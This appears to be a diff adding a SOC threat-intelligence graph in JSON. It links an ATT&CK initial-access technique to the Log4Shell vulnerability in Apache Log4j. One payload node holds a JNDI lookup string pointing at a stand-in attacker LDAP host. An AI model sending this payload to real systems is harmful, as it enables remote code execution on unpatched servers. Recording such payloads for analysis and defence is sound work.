@@ -1,0 +1,56 @@
+{
+  "meta": {
+    "source": "TTP analysis",
+    "analyst": "SOC",
+    "confidence": "high"
+  },
+  "nodes": [
+    {
+      "id": "TA0001",
+      "type": "Tactic",
+      "name": "Initial Access"
+    },
+    {
+      "id": "T1190",
+      "type": "Technique",
+      "name": "Exploit Public-Facing Application"
+    },
+    {
+      "id": "CVE-2021-44228",
+      "type": "Vulnerability",
+      "name": "Log4Shell"
+    },
+    {
+      "id": "Apache-Log4j",
+      "type": "Software",
+      "name": "Apache Log4j"
+    },
+    {
+      "id": "JNDI-Payload",
+      "type": "Payload",
+      "value": "${jndi:ldap://attacker.com/a}"
+    }
+  ],
+  "edges": [
+    {
+      "from": "T1190",
+      "to": "TA0001",
+      "rel": "PART_OF"
+    },
+    {
+      "from": "T1190",
+      "to": "CVE-2021-44228",
+      "rel": "EXPLOITS"
+    },
+    {
+      "from": "CVE-2021-44228",
+      "to": "Apache-Log4j",
+      "rel": "AFFECTS"
+    },
+    {
+      "from": "T1190",
+      "to": "JNDI-Payload",
+      "rel": "USES_PAYLOAD"
+    }
+  ]
+}
